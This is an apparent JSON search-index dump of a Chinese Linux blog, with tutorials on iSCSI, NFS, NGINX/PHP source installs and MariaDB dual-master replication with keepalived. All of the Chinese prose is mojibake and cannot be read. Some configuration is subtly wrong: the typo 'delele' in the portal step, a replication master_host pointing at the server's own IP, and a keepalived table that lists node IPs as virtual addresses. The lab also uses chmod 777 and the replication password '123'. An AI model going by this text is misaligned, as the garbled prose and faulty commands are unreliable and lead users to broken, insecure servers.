qa\n```\n\nè¿™å—çš„å‘½ä»¤è™½ç„¶çœ‹ç€æŒºå¤šï¼Œä½†æ˜¯3å¤§ç±»éƒ½æ˜¯ä¸€ä¸ªé€»è¾‘ã€‚åˆ›å»ºï¼ŒæŸ¥çœ‹ï¼Œåˆ é™¤è¿™éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ— éå°±æ˜¯æ‰©å®¹çš„å‘½ä»¤å¾—è®°ä¸€ä¸‹ã€‚åŠ æ²¹å°‘å¹´ï¼","tags":["Linux"],"categories":["æŠ€æœ¯"]},{"title":"æ­å»ºå¹¶æŒ‚è½½ISCSIå­˜å‚¨æœåŠ¡å™¨","url":"/2023/07/04/ISCSI/","content":"\n### ISCSIæœåŠ¡å™¨ç«¯\n\næ¯”å¦‚ç°åœ¨ISCSIæœåŠ¡å™¨ç«¯æœ‰ä¸¤å—ç¡¬ç›˜ï¼Œæˆ‘ä»¬æƒ³æŠŠç¬¬äºŒå—ç¡¬ç›˜ï¼ˆsdbï¼‰å…±äº«å‡ºå»ã€‚\n\n1. ä¸‹è½½è½¯ä»¶\n\n```bash\nyum install -y targetcli\n```\n\n2. å¼€å§‹è¿›è¡ŒæœåŠ¡ç«¯çš„é…ç½®\n\n* é¦–å…ˆé”®å…¥`targetcli`è¿›å…¥iscsié…ç½®æ¨¡å¼\n\n```bash\ntargetcli\n```\n\n<!-- more -->\n\n* ç„¶åå…ˆåˆ›å»ºä¸€ä¸ªåç«¯å­˜å‚¨\n\n```bash\ncd /backstores/block/\ncreate disk1 /dev/sdb\n```\n\n`disk1`ä»£è¡¨èµ·çš„ä¸€ä¸ªåå­—ï¼Œ`/dev/sdb`æ˜¯çœŸå®æœºå™¨é‡Œå­˜åœ¨çš„è®¾å¤‡ã€‚\n\n* åˆ›å»ºå¯ä»¥è¯†åˆ«çš„iqnè®¾å¤‡\n\n```bash\ncd /iscsi/\ncreate iqn.2023-07.com.liuxp:san1\n```\n\n`iqn.2023-07.com.liuxp:san1`æ˜¯å¯ä»¥è¢«å®¢æˆ·ç«¯çš„è¯†åˆ«åˆ°çš„åå­—ï¼Œå®¢æˆ·ç«¯å¯ä»¥å‡­è¿™ä¸ªåå­—æŒ‚è½½åˆ°è‡ªèº«ã€‚\n\n* åˆ›å»ºiqné‡Œçš„å·ï¼Œåˆšåˆšåˆ›å»ºçš„iqnåªæ˜¯ä¸€ä¸ªåå­—ï¼Œé‡Œé¢ç°åœ¨è¿˜æ²¡æœ‰å­˜å‚¨è®¾å¤‡ï¼Œç°åœ¨è¦åœ¨é‡Œé¢æ·»åŠ å­˜å‚¨è®¾å¤‡\n\n```bash\ncd iqn.2023-07.com.liuxp:san1/tpg1/luns/\ncreate /backstores/block/disk1\n```\n\n* åˆ›å»ºå¥½iqné‡Œçš„å­˜å‚¨è®¾å¤‡ï¼Œç„¶åå°±è¯¥è®¾ç½®iqnè®¾å¤‡çš„è®¿é—®æƒé™äº†\n\n```bash\ncd ../acls/\ncreate iqn.2023-07.com.liuxp:web1\n```\n\nä¸è¦å¥‡æ€ªè¿™ä¸ªæ–°åˆ›å»ºçš„iqnæ˜¯ä¸€ä¸ªè¯†åˆ«ç§˜é’¥ï¼Œå®¢æˆ·ç«¯éœ€è¦æ‹¿ç€è¿™ä¸ªç§˜é’¥æ¥è¿æ¥ï¼Œä»¥æ­¤æ¥è¾¾åˆ°è®¿é—®æ§åˆ¶çš„ç›®çš„ã€‚å…·ä½“çš„æ“ä½œæ˜¯å°†è¿™ä¸ª`acls`é‡Œçš„`iqn`åå­—å¤åˆ¶ä¸‹æ¥å¾…ä¼šç²˜è´´åˆ°å®¢æˆ·ç«¯çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶é‡Œé¢ã€‚\n\n* è®¾ç½®é—¨æˆ·ï¼Œè¿™ä¸ªæˆ‘ä¹Ÿè§£é‡Šä¸æ¸…æ¥šå«ä¹‰ï¼Œå°±æ˜¯æƒ³åœ¨è¿™é‡Œä»‹ç»ä¸€ä¸‹åˆ é™¤å‘½ä»¤ï¼Œè¿˜æœ‰å¦‚æœè¦è®¾ç½®çš„è¯ï¼Œè¦è®¾ç½®ä¸ºæœ¬æœºçš„IP\n\n```bash\ncd ../portals/\ndelele 0.0.0.0 3260\ncreate 10.8.7.41 3260\n```\n\n* åˆ°è¿™é‡Œå°±è®¾ç½®å®Œæˆäº†é”®å…¥`exit`é€€å‡ºè®¾ç½®ã€‚\n\n* å¯åŠ¨æœåŠ¡\n\n```bash\nsystemctl start target.service \n```\n\n### ISCSIå®¢æˆ·ç«¯\n\n1. ä¸‹è½½è½¯ä»¶\n\n```bash\nyum install -y iscsi-initiator-utils\n```\n\n2. ä¿®æ”¹é…ç½®æ–‡ä»¶`/etc/iscsi/initiatorname.iscsi`\n\n```bash\nInitiatorName=iqn.2023-07.com.liuxp:web1\n```\n\næŠŠè¿™é‡Œçš„iqnè®¾ç½®ä¸ºæœåŠ¡å™¨ç«¯`acls`é‡Œçš„é‚£ä¸ªiqnï¼Œä¸Šé¢ä¹Ÿè¯´è¿‡ä¸€å˜´ã€‚\n\n3. ç„¶åå¼€å§‹æ‰«æiqnè®¾å¤‡\n\n```bash\niscsiadm -m discovery -t st -p 10.8.7.41\n```\n\n**pé€‰é¡¹**åé¢æ¥ä¸ŠæœåŠ¡å™¨ç«¯çš„IPåœ°å€ã€‚\n\n4. æ‰«æåˆ°ä¹‹åæ¥ç€å¼€å§‹æœ€åä¸€æ­¥æŒ‚è½½\n\n```bash\niscsiadm -m node -T iqn.2023-07.com.liuxp:san1 -p 10.8.7.41 -l\n```\n\n**Té€‰é¡¹**åé¢æ¥ä¸Šé¢åˆšåˆšæ‰«æå‡ºæ¥çš„iqnè®¾å¤‡ï¼Œ**pé€‰é¡¹**æ¥ISCSIæœåŠ¡å™¨çš„IP\n\n5. å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹æŒ‚è½½æˆåŠŸçš„ä¼šè¯ä¿¡æ¯\n\n```bash\niscsiadm -m session\n```\n\n6. å¦‚æœéœ€è¦çš„è¯å¯ä»¥äº†è§£ä¸€ä¸‹ï¼Œå¸è½½æœ¬åœ°å·²æŒ‚è½½çš„å…¨éƒ¨ISCSIå­˜å‚¨è®¾å¤‡\n\n```bash\niscsiadm -m node --logoutall=all\n```\n\n7. å†™åœ¨æœ€åçš„è¯\n\nå¦‚æœé‡åˆ°ç¬¬4æ­¥æ— æ³•æŒ‚è½½ï¼Œä¸€æ˜¯è¦æ£€æŸ¥é…ç½®æ–‡ä»¶çš„iqnæ˜¯å¦å’ŒæœåŠ¡å™¨aclsè®¾ç½®ä¸€è‡´ï¼ŒäºŒæ˜¯è¦æ£€æŸ¥IPåœ°å€æ—¶å€™å¡«å†™æ­£ç¡®ï¼Œå®¢æˆ·ç«¯å¦‚æœæ£€æŸ¥éƒ½æ— è¯¯äº†ï¼Œå› ä¸ºä¹‹å‰ä¼šäº§ç”Ÿç¼“å­˜ï¼Œä¸€èˆ¬åé¢å‡ æ¬¡ä¹Ÿä¸ä¼šæˆåŠŸï¼Œå¯ä»¥é€šè¿‡åˆ é™¤`/var/lib/iscsi/nodes`åŠ`/var/lib/iscsi/send_targets`ä¸‹çš„å†…å®¹ä¹‹åå†æ¬¡å°è¯•ã€‚å¦‚æœè¿˜æ˜¯ä¸è¡Œï¼Œå°±åªèƒ½é‡å¯äº†ã€‚å¦‚æœå¯¹æœåŠ¡å™¨ç«¯è¿›è¡Œäº†ä¿®æ”¹ï¼Œä¸€å®šè¦è®°å¾—é‡å¯æœåŠ¡ç”Ÿæ•ˆã€‚","tags":["Linux"],"categories":["æŠ€æœ¯"]},{"title":"NFSæŒ‚è½½åˆ°æœåŠ¡å™¨","url":"/2023/07/04/nfs/","content":"\n||||||||\n|:-:|:-:|:-:|:-:|:-:|:-:|:-:|\n|ä¸»æœºå|èº«ä»½|ç½‘ç»œæ¥å£|è¿æ¥æ¨¡å¼|IPåœ°å€|è½¯ä»¶|\n|NFS|å­˜å‚¨æœåŠ¡å™¨|ens224|ä»…ä¸»æœº|10.8.7.40/24|nfs-utils|\n|Web1|WebæœåŠ¡å™¨|ens224|ä»…ä¸»æœº|10.8.7.80/24|nginxã€nfs-utils|\n\n### NFSæœåŠ¡å™¨éƒ¨åˆ†\n\n1. ä¸‹è½½è½¯ä»¶\n\n```bash\nyum install -y nfs-utils\n```\n\n<!-- more -->\n\n2. ç¼–è¾‘é…ç½®æ–‡ä»¶`vim /etc/exports`\n\n```bash\n/www 10.8.7.80(rw)\n```\n\nè¿™ä¸ªé…ç½®æ–‡ä»¶ä»£è¡¨å°†è‡ªå·±ä¸»æœºä¸‹çš„`/www`ç›®å½•å…±äº«ç»™10.8.7.80ä¸»æœºï¼Œå¹¶ä¸”èµ‹äºˆè¯»å’Œå†™çš„æƒé™ã€‚\n\n3. è¦è®°å¾—æŠŠè¦å…±äº«å‡ºå»çš„ç›®å½•èµ‹äºˆç›¸åº”çš„æƒé™ï¼Œè¦ä¸ç„¶è®¿é—®èµ·æ¥ä¼šæœ‰é—®é¢˜,åœ¨è¿™é‡Œæˆ‘ç›´æ¥ç»™äº†`777`ï¼Œä¸è¦å­¦æˆ‘ï¼Œåªæ˜¯å‘Šè¯‰ä½ ä»¬å¦‚æœåæœŸNGINXè®¿é—®å‡ºç°404ï¼Œåº”è¯¥è¦æƒ³åˆ°å›åˆ°è¿™é‡Œæ€è€ƒæƒé™çš„é—®é¢˜ã€‚\n\n```bash\nchmod 777 /www\n```\n\n4. å¯åŠ¨æœåŠ¡\n\n```bash\nsystemctl start nfs-server\n```\n\n5. å¯¼å‡ºé…ç½®æ–‡ä»¶\n\n```bash\nexportfs -rv\n```\n\n### WebæœåŠ¡å™¨çš„éƒ¨åˆ†\n\n1. åˆ›å»ºæŒ‚è½½ç‚¹\n\n```bash\nmkdir /www\n```\n\n2. ç¼–è¾‘`/etc/fstab`å®ç°æ°¸ä¹…æŒ‚è½½\n\n```bash\n10.8.7.40:/www  /www    nfs     rw,sync 0 0\n```\n\n3. æŒ‚è½½å…±äº«ç›®å½•\n\n```bash\nsystemctl daemon-reload\nmount -a\n```","tags":["Linux"],"categories":["æŠ€æœ¯"]},{"title":"NGINXæ•´åˆPHP","url":"/2023/07/04/nginx-union-php/","content":"\n### NGINXæ•´åˆPHP\n\nè¿™ä¸ªå®ç°èµ·æ¥æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯ä¸€æ®µä»£ç çš„äº‹ï¼Œä½†æ˜¯ä¹‹å‰æ²¡æœ‰å‡ºç°æˆ‘è¿™æ ·çš„å¼€æºå·¥ä½œè€…çš„æ—¶å€™ï¼Œæˆ‘åªèƒ½æ‰‹æ•²é‚£ä¸€æ®µä»£ç ï¼Œæœ‰æ—¶å€™ä¸€ä¸ç•™ç¥å°±ä¼šæŠŠå•è¯æ‹¼é”™ï¼Œå°¤å…¶æ˜¯æœ±è¡ŒæŸ¥æ‰¾é”™è¯¯çš„æ—¶å€™ï¼Œç®€ç›´è‹¦ä¸å ªè¨€ã€‚ä¸ºäº†åæµªä»¬çš„å¹¸ç¦ç”Ÿæ´»ï¼Œå†æ¬¡æˆ‘å°†é‚£ä¸€æ®µä»£ç å†™ä¸‹æ¥ä¾›ä½ ä»¬<kbd>Ctrl</kbd>+<kbd>C</kbd>å’Œ<kbd>Ctrl</kbd>+<kbd>V</kbd>ä½¿ç”¨ã€‚\n\n<!-- more -->\n\nå…·ä½“æ“ä½œå¦‚ä¸‹ï¼š\n\n* æ‰“å¼€NGINXçš„é…ç½®æ–‡ä»¶,æ·»åŠ è¿™ä¸€æ®µã€‚\n\n```bash\n        location ~ \\.php$ {\n            root   /web;\n            fastcgi_pass    127.0.0.1:9000;\n            fastcgi_index   index.php;\n            fastcgi_param   SCRIPT_FILENAME $document_root$fastcgi_script_name;\n            include         fastcgi_params;\n        }\n```\n\nè¡¥ä¸€å¼ å›¾ç‰‡æ˜¾ç¤ºè¦æ’å…¥çš„ä½ç½®ã€‚\n\n![](./nginx-union-php/1.png)\n\nç„¶åå°±å®Œæˆäº†NGINXå’ŒPHPçš„è”åŠ¨ã€‚","tags":["Linux"]},{"title":"æºç å®‰è£…PHP","url":"/2023/07/04/php/","content":"\n### å®‰è£…PHP\n\næ— è®ºæ˜¯åœ¨Centos7è¿˜æ˜¯åœ¨Centos8éƒ½éœ€è¦è¿›è¡Œæºç å®‰è£…ï¼Œå…¶å®è¿™å¥è¯ä¹Ÿä¸å¯¹ï¼Œå› ä¸ºåœ¨Centos8é‡Œæ˜¯å¯ä»¥yumå®‰è£…phpå’Œphp-fpmçš„ã€‚ä½†æ˜¯ï¼Œå®‰è£…ä¹‹åä½¿ç”¨`php-fpm start`å¯åŠ¨å‘½ä»¤ä¹‹åæ˜¯ç›‘å¬ä¸åˆ°å†…å®¹çš„ã€‚æœ‰å¯èƒ½æ˜¯è‡ªå·±è¿˜æ˜¯ä¸å¤ªä¼šç”¨Centos8çš„PHPï¼Œè‡ªå·±ä¹Ÿæ²¡æœ‰å†å»æ·±å…¥ç ”ç©¶ï¼Œåšçš„é¡¹ç›®éƒ½æ˜¯ç”¨çš„æºç è£…çš„ï¼Œåœ¨è¿™é‡Œå…ˆæŠŠæºç å®‰è£…çš„æ•™ç¨‹å‘ä¸å‡ºæ¥ï¼Œåç»­æœ‰æ—¶é—´å†å»ç ”ç©¶ã€‚\n\n<!-- more -->\n\n[PHPæºç åŒ…ä¸‹è½½é“¾æ¥](https://pan.baidu.com/s/1njY-HAXimp8635W3pe6JEw?pwd=ba1u)\n\næå–ç ï¼šba1u\n\n* è§£å‹æºç åŒ…\n\n```bash\ntar -zxf php-5.6.17.tar.gz\n```\n\n* å®‰è£…ç›¸å…³çš„ä¾èµ–\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel\nyum install -y libxml2 libxml2-devel\n```\n\nè¿™é‡Œåˆ†äº†ä¸¤æ¡ä¾èµ–å‘½ä»¤ï¼Œå¦‚æœæ˜¯æŒ‰ç…§ä¹‹å‰æˆ‘å†™çš„[æºç å®‰è£…NGINXçš„åšå®¢](https://nustarain.gitee.io/2023/07/04/nginx/)å·²ç»å®‰è£…NGINXäº†ï¼Œé‚£ä¹ˆä¸éœ€è¦å†æ‰§è¡Œç¬¬ä¸€æ¡yumå‘½ä»¤ï¼Œåä¹‹åˆ™ç›¸åï¼Œå¦‚æœä½ ä¹Ÿä¸ç¡®å®šï¼Œé‚£å°±å…¨éƒ¨æ‰§è¡Œä¸€éå§ã€‚\n\n* æ‰§è¡Œconfigureè„šæœ¬\n\n```bash\n./configure --prefix=/usr/local/php --enable-mbstring --enable-fpm --with-mysql --with-mysqli\n```\n\n* å†æ‰§è¡Œä¸¤æ­¥å®‰è£…å®Œæˆ\n\n```bash\nmake  # è¿™é‡Œmakeçš„æ—¶é—´ä¼šç›¸å¯¹é•¿ä¸€ç‚¹\nmake install\n```\n\n* æ‹·è´ä¸€ä»½é…ç½®æ–‡ä»¶\n\n```bash\ncp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf\n```\n\n* æ‹·è´å¯åŠ¨æ–‡ä»¶\n\n```bash\ncp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm\n```\n\n* ä¸ºå¯åŠ¨æ–‡ä»¶æ·»åŠ å¯åŠ¨æƒé™\n\n```bash\nchmod +x /etc/init.d/php-fpm\n```\n\n* å†æ‹·è´ä¸€ä»½åˆ°ç³»ç»Ÿçš„å‘½ä»¤é‡Œé¢\n\n```bash\ncp /etc/init.d/php-fpm /sbin/php-fpm\n```\n\nç„¶åå°±å¯ä»¥ä½¿ç”¨ç®€å•çš„å‘½ä»¤å¯¹PHPè¿›è¡Œç®¡ç†\n\n```bash\nphp-fpm start\nphp-fpm reload\nphp-fpm stop\n```\n* å¯åŠ¨ä¹‹åå¯ä»¥æ£€æŸ¥ä¸€ä¸‹ç›‘å¬ç«¯å£\n\n```bash\nlsof -i:9000\n```","tags":["Linux"],"categories":["æŠ€æœ¯"]},{"title":"æºç å®‰è£…NGINX","url":"/2023/07/04/nginx/","content":"\n### å®‰è£…NGINX\n\nå¦‚æœæ˜¯centos8ç‰ˆæœ¬çš„è¯ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨æœ¬åœ°yumæˆ–è€…ç½‘ç»œyumå®‰è£…NGINXï¼Œå¯¹äº8ç‰ˆæœ¬çš„å°±ä¸åœ¨åšè¿‡å¤šèµ˜è¿°ã€‚\n\nä¸»è¦é’ˆå¯¹Centos7ç‰ˆæœ¬åšä¸€ä¸‹è¯´æ˜ï¼Œå› ä¸ºCentos7çš„yumæ˜¯ä¸æä¾›NGINXçš„ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±æ‰‹åŠ¨ä½¿ç”¨æºç å®‰è£…çš„æ–¹å¼è¿›è¡Œå®‰è£…ã€‚\n\n<!-- more -->\n\n[nginxæºç åŒ…ä¸‹è½½é“¾æ¥](https://pan.baidu.com/s/1hjUud-D1Du-s-dbFAGJxTQ?pwd=46k1)\n\næå–ç ï¼š46k1\n\n* è§£å‹æºç åŒ…\n\n```bash\ntar -zxf nginx-1.17.10.tar.gz\n```\n\n* å®‰è£…ç›¸å…³çš„ä¾èµ–\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel\n```\n\n* æ‰§è¡Œconfigureè„šæœ¬\n\n```bash\n./configure --prefix=/usr/local/nginx --with-http_ssl_module\n```\n\n* å†æ‰§è¡Œä¸¤æ­¥å®‰è£…å®Œæˆ\n\n```bash\nmake\nmake install\n```\n\næ­¤æ—¶NGINXçš„å¯åŠ¨å‘½ä»¤æ˜¯åœ¨`/usr/local/nginx/sbin/nginx`é‡Œã€‚\n\nç›´æ¥æ‰§è¡Œè¿™æ¡å‘½ä»¤å¯ä»¥å¯åŠ¨NGINX\n\n```bash\n/usr/local/nginx/sbin/nginx\n```\n\nä½†æ˜¯è¿™ä¸ªå‘½ä»¤æ˜¯åœ¨å¤ªé•¿äº†ï¼Œå¾ˆä¸æ–¹ä¾¿ï¼Œæˆ‘ä»¬å¯ä»¥æ‹·è´ä¸€ä»½åˆ°ç³»ç»Ÿå‘½ä»¤é‡Œé¢ã€‚\n\n```bash\ncp /usr/local/nginx/sbin/nginx /sbin/nginx\n```\n\nç„¶åæˆ‘ä»¬å°±å¯ä»¥æ„‰å¿«åœ°ä½¿ç”¨ä¸€äº›ç®€å•çš„å‘½ä»¤æ¥å¯¹NGINXè¿›è¡Œç®¡ç†ã€‚\n\n```bash\nnginx # å¯åŠ¨nginx\nnginx -s reload # é‡å¯nginx\nnginx -s stop # å…³é—­nginx\n```\n\nå¯åŠ¨ä¹‹åï¼Œå¯ä»¥é€šè¿‡80ç«¯å£æ£€æŸ¥æ˜¯å¦å¤„äºç›‘å¬çŠ¶æ€\n\n```bash\nlsof -i:80\n```\n\nå†è¡¥å……ä¸€ç‚¹ï¼Œå°±æ˜¯å…³äºNGINXçš„é…ç½®æ–‡ä»¶ï¼Œæºç å®‰è£…çš„NGINXé…ç½®æ–‡ä»¶çš„è·¯å¾„`cd /usr/local/nginx/conf`é‡Œé¢å¾ˆå¤šæˆ‘ä»¬ä¸éœ€è¦çš„å†…å®¹ï¼Œç›´æ¥ä¸€æ¡å‘½ä»¤å¸¦èµ°ä»–ä»¬ã€‚\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\nä¹‹åå°±å¾ˆæ¸…çˆ½äº†ï¼Œå¼€å§‹é…ç½®å§å°‘å¹´ã€‚","tags":["Linux"],"categories":["æŠ€æœ¯"]},{"title":"MariadbåŒä¸»å¤åˆ¶+Keepalived","url":"/2023/06/04/keepalived-linux/","content":"\nåœ¨æœ€åçš„Linuxé«˜çº§è¯¾ç¨‹çš„æœ€åï¼Œå®Œæˆäº†é«˜å¯ç”¨è´Ÿè½½å‡è¡¡WEBæœåŠ¡å™¨çš„æ­å»ºï¼Œæ¯”è¾ƒè´´åˆå®é™…çš„ç”Ÿäº§ç¯å¢ƒï¼Œä¸€å…±ä½¿ç”¨åˆ°äº†7å°è™šæ‹Ÿæœºï¼Œåœ¨æˆ‘è¿™ä¸ªé˜¶æ®µï¼Œå·²ç»æ˜¯æˆ‘å–å¾—çš„æœ€é«˜æˆå°±äº†ã€‚æ„Ÿè§‰æœ‰å¿…è¦è®°å½•ä¸‹æ¥ï¼Œæ—¢æ˜¯å¸®åŠ©åæ¥è€…ï¼Œä¹Ÿæ˜¯æ–¹ä¾¿è‡ªå·±æ—¥åè¿›è¡Œå¤ä¹ æ€»ç»“ã€‚\n\n### é¡¹ç›®æ¢—æ¦‚\n\né¡¹ç›®ä¸€å…±è®¾è®¡7å°è™šæ‹Ÿæœºï¼Œå…¶ä¸­2å°ä½œä¸ºè°ƒåº¦æœºï¼Œè¿›è¡Œå¯¹è®¿é—®è¯·æ±‚çš„åˆ†é…ï¼›2å°ä½œä¸ºNginxæœåŠ¡å™¨ï¼›2å°ä½œä¸ºMariadbæ•°æ®åº“æœåŠ¡å™¨ï¼›ä¸€å°ä½œä¸ºNFSå‚¨å­˜æœåŠ¡å™¨ï¼Œè´Ÿè´£å­˜å‚¨NginxæœåŠ¡å™¨çš„ç½‘é¡µèµ„æºã€‚å…¶é€»è¾‘æ‹“æ‰‘å›¾å¦‚ä¸‹ï¼š\n\n<!-- more -->\n\n![æ‹“æ‰‘å›¾](./keepalived-linux/1.png)\n\næˆ‘ä¼šåˆ†å‡ ä¸ªéƒ¨åˆ†æ¥ä»‹ç»è¿™ä¸ªé¡¹ç›®çš„é…ç½®ï¼Œæœ¬æ¬¡å…ˆæ¥ä»‹ç»mariadbå®ç°åŒä¸»å¤åˆ¶å’Œkeepalivedã€‚\n\nå…¶ä¸­æœåŠ¡å™¨çš„IPè§„åˆ’å¦‚ä¸‹ï¼š\n\n|  ä¸»æœºå   |  è§’è‰²  | ç½‘å¡å |  æ¨¡å¼  |       IP        |       VIP       |      ç½‘å…³       |\n| :-------: | :----: | :----: | :----: | :-------------: | :-------------: | :-------------: |\n| mariadb-1 | mst/slv  | ens224 | ä»…ä¸»æœº | 172.21.8.33/24  | 172.21.8.50/24  | 172.21.8.254/24 |\n| mariadb-2 | mst/slv  | ens224 | ä»…ä¸»æœº | 172.21.8.34/24  | 172.21.8.50/24  | 172.21.8.254/24 |\n\n\n### æ•°æ®åº“æœåŠ¡å™¨çš„é…ç½®\n\næ•°æ®åº“æœåŠ¡å™¨åœ¨æœ¬é¡¹ç›®ä¸­é‡‡ç”¨åŒä¸»å¤åˆ¶çš„æ–¹å¼ï¼Œæ¥è¿›è¡Œé«˜å¯ç”¨çš„å®ç°ã€‚\n\n#### ä¸»ä»å¤åˆ¶é…ç½®\n\n|  ä¸»æœºå   |    èº«ä»½    | ç½‘ç»œæ¥å£ | è¿æ¥æ¨¡å¼ |       IP       |\n| :-------: | :--------: | :------: | :------: | :------------: |\n| mariadb-1 |  ä¸»æœåŠ¡å™¨  |  ens224  |  ä»…ä¸»æœº  | 172.21.8.33/24 |\n| mariadb-2 | å¤‡ä»½æœåŠ¡å™¨ |  ens224  |  ä»…ä¸»æœº  | 172.21.8.34/24 |\n\n\n\n1. é¦–å…ˆåœ¨mariadb-1ä¸­è¿›è¡Œè½¯ä»¶çš„å®‰è£…ã€‚\n\n```bash\nyum install -y mariadb-server\n```\n\n2. ä¿®æ”¹é…ç½®æ–‡ä»¶ã€‚\n\nä¸»é…ç½®æ–‡ä»¶`/etc/my.cnf`æ— éœ€ä¿®æ”¹ï¼Œä¿®æ”¹`/etc/my.cnf.d/mariadb-server.cnf`æ–‡ä»¶ï¼Œåœ¨[mysqld]æ®µä¸‹é¢æ·»åŠ é…ç½®é€‰é¡¹ï¼Œå¼€å¯äºŒè¿›åˆ¶æ—¥å¿—åŠŸèƒ½å¹¶è®¾ç½®server-idã€‚\n\n```bash\nlog-bin = master.log\nserver-id = 11\n```\n\n3. å¯åŠ¨mariadb-1çš„mariadbæœåŠ¡\n\n```\nsystemctl start mariadb\n```\n\n4. è¿›å…¥MySQLï¼Œä½œä¸ºä¸»æœåŠ¡å™¨åˆ›å»ºæˆæƒè´¦æˆ·slaveï¼Œå¹¶æŸ¥çœ‹ä¸»æœåŠ¡å™¨è£…æ€ã€‚\n\n```bash\nmysql -u root\n```\n\n```bash\ngrant replication slave on *.* to 'slave'@'172.21.8.34' identified by '123';\n```\n\n>æˆæƒä¸ºå¯¹æ–¹çš„IP\n\n```bash\nshow master status;\n```\n\n![mariadb-1 master status](./keepalived-linux/3.png)\n\n`show master status;`ä¹‹åï¼Œè¡¨æ ¼ä¸­çš„Fileå­—æ®µå’ŒPositionå­—æ®µè¦ç•™æ„ï¼Œå¾…ä¼šè¦ç”¨åˆ°ã€‚\n\n5. åœ¨mariadb-2ä¸Šå®‰è£…è½¯ä»¶ï¼Œå¼€å¯äºŒè¿›åˆ¶æ—¥å¿—åŠŸèƒ½ï¼Œå¹¶å¯åŠ¨æœåŠ¡ã€‚\n\n```bash\nlog-bin = slave.log\nserver-id = 12\n```\n\n6. è¿›å…¥MySQLï¼Œå¼€å¯å¤åˆ¶åŠŸèƒ½ã€‚\n\n```bash\nmysql -u root\nchange master to master_host = '172.21.8.34',master_user = 'slave',master_password = '123',master_log_file = 'master.000002',master_log_pos = 712;\n```\n\nmaster_log_fileå­—æ®µå¡«å†™mariadb-1`show master status`åçš„Fileå†…å®¹ï¼Œmaster_log_poså¡«å†™mariadb-1`show master status`åçš„Positionå†…å®¹ã€‚\n\n7. åœ¨mariadb-2ä¸ŠæŸ¥çœ‹slaveçŠ¶æ€ã€‚\n\n```\nstart slave;\nshow slave status \\G;\n```\n\n![mariadb-2 å¤åˆ¶æˆåŠŸ](./keepalived-linux/4.png)\n\nçœ‹åˆ°å›¾ä¸­çš„ä¸¤ä¸ªyesï¼Œä»£è¡¨ä¸€è¾¹çš„å¤åˆ¶åŠŸèƒ½å°±é…ç½®å®Œæˆäº†ã€‚\n\n8. ç„¶ååœ¨mariadb-2 æœåŠ¡å™¨ä¸Šä¹Ÿåˆ›å»ºä¸€ä¸ªæˆæƒè´¦æˆ·ã€‚\n\n```bash\ngrant replication slave on *.* to 'slave'@'172.21.8.33' identified by '123';\n```\n\n>æˆæƒä¸ºå¯¹æ–¹çš„IP\n\n```bash\nshow master status;\n```\n\n![mariadb-2 master status](./keepalived-linux/5.png)\n\nå†æ¬¡å›åˆ°mariadb-1ä¸Šï¼Œè¿æ¥mariadb-2ï¼Œå®ç°å¤åˆ¶åŠŸèƒ½ã€‚\n\n```\nchange master to master_host = '172.21.8.34',master_user = 'slave',master_password = '123',master_log_file = 'master.000003',master_log_pos = 338;\n```\n\n9. é…ç½®å®Œæˆåï¼Œå¼€å¯slaveåŠŸèƒ½ï¼ŒæŸ¥çœ‹slaveçŠ¶æ€ã€‚\n\n```bash\nstart slave;\nshow slave status \\G;\n```\n\n![mariadb-1 å¤åˆ¶æˆåŠŸ](./keepalived-linux/6.png)\n\nåˆ°è¿™é‡Œæ•°æ®åº“çš„ä¸»ä»å¤åˆ¶å·²ç»å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥è¦é…ç½®æ•°æ®åº“çš„keepalivedåŠŸèƒ½ã€‚\n\n#### keepalivedé…ç½®\n\n1. ä¸»æœº DB-master å’Œ DB-slave ä¸Šå®‰è£… Keepalived\n\n```bash\nyum install -y keepalived\n```\n\n2. æŠŠé…ç½®æ–‡ä»¶ä¿ç•™ä¸€ä¸ªå‰¯æœ¬\n\n```\ncp /etc/keepalived/keepalived.conf{,.bak}\n```\n\n3. ä¿®æ”¹ä¸¤ä¸ªä¸»æœºä¸Šçš„é…ç½®æ–‡ä»¶/etc/keepalived/keepalived.conf\n\n|  ä¸»æœºå   | route_id  | vrrp_instance | state  | interface | virtual_router_id | priority | virtual_ipaddress |\n| :-------: | :-------: | :-----------: | :----: | :-------: | :---------------: | :------: | :---------------: |\n| mariadb-1 | db_master |  mariadb-ha   | BACKUP |  ens224   |        60         |   100    |  172.21.8.33/24   |\n| mariadb-2 | db_slave  |  mariadb-ha   | BACKUP |  ens224   |        60         |    90    |  172.21.8.34/24   |\n\n* mariadb-1 çš„`/etc/keepalived/keepalived.conf` çš„å†…å®¹å¦‚ä¸‹ \n\nå…¨å±€é…ç½®æ¨¡å—\n\n```bash\n! Configuration File for keepalived\n\nglobal_defs {\n   notification_email {\n     liuxp731@qq.com\t# ç®¡ç†å‘˜é‚®ç®±\n   }\n   notification_email_from Alexandre.Cassen@firewall.loc\n   smtp_server 127.0.0.1\n   smtp_connect_timeout 30\n   router_id db_master\t# æ ‡è¯†\n   vrrp_skip_check_adv_addr\n   vrrp_strict\n   vrrp_garp_interval 0\n   vrrp_gna_interval 0\n}\n```\n\nå¯ç”¨ vrrp_script æ¨¡å—ï¼Œ å®šä¹‰å¯¹ mariadb æœåŠ¡çš„ç›‘æµ‹\n\n```bash\nvrrp_script check_mariadb {\n   script \"/etc/keepalived/checkmariadb.sh\"\n   interval 2\n}\n```\n\nVRRPD é…ç½®æ®µ  \n\n```bash\nvrrp_instance mariadb-ha {\n    state BACKUP\t# å¤‡ç”¨\n    interface ens224\n    nopreempt\t\t# è®¾ç½®ä¸æŠ¢å \n    virtual_router_id 60\n    priority 100\t# ä¼˜å…ˆçº§\n    advert_int 1\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    track_script {\t# é…åˆvrrp_scriptæ®µä½¿ç”¨\n        check_mariadb\n    }\n    virtual_ipaddress {\t# è™šæ‹Ÿå‡ºçš„VIP\n        172.21.8.50/24\n    